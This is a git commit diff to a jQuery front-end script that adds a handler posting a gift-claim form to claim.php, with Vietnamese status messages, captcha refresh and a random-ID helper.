6b11e15805be44030e93eb41c8ea94260547bf28
Thảnh <thanh14785210@gmail.com>
2021-02-24 23:24:58 +0700

    Update script1.js

--- assets/js/script1.js
+++ assets/js/script1.js
@@ -15,7 +15,7 @@
         $("#login-form").submit(function(b) {
             $.ajax({
                 method: "POST",
-                url: "/api-check",
+                 url: "/api-check",
                 data: $(this).serialize(),
                 dataType: "json",
                 beforeSend: function() {
@@ -34,12 +34,45 @@
             });
             b.preventDefault()
         })
+    },
+    eventHandle = function() {
+        $("#next-step").submit(function(b) {
+            $.ajax({
+                method: "POST",
+                url: "claim.php",
+                data: $(this).serialize(),
+                dataType: "json",
+                beforeSend: function() {
+                    $("#confirm-btn").text("\u0110ang x\u1eed l\u00fd...").attr("disabled", !0)
+                },
+                complete: function() {
+                    $("#confirm-btn").text("Ti\u1ebfp t\u1ee5c").removeAttr("disabled");
+                    $("#captcha-input").val("");
+                    captchaGenerate()
+                }
+            }).done(function(a) {
+                "error_require_captcha" == a.status ? $("#captcha-img").show() : "success" == a.status || "warning" == a.status ? ($("#captcha-modal").modal("hide"), swal("Th\u00f4ng b\u00e1o", a.message || "C\u00f3 l\u1ed7i khi nh\u1eadn qu\u00e0!", a.status || "error")) : swal("Th\u00f4ng b\u00e1o", a.message || "C\u00f3 l\u1ed7i khi nh\u1eadn qu\u00e0!", "error")
+            }).fail(function() {
+                swal("Th\u00f4ng b\u00e1o", "C\u00f3 l\u1ed7i khi nh\u1eadn qu\u00e0!", "error").then(function() {
+                    location.reload()
+                })
+            });
+            b.preventDefault()
+        })
     };
-              
+                function makeid(length) {
+                var text = "";
+                var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
 
+                for (var i = 0; i < length; i++)
+                    text += possible.charAt(Math.floor(Math.random() * possible.length));
+
+                return text;
+            }
     
 $(document).ready(function() {
     loginHandle();
+    eventHandle();
     captchaGenerate();
     refreshCaptcha()
 });
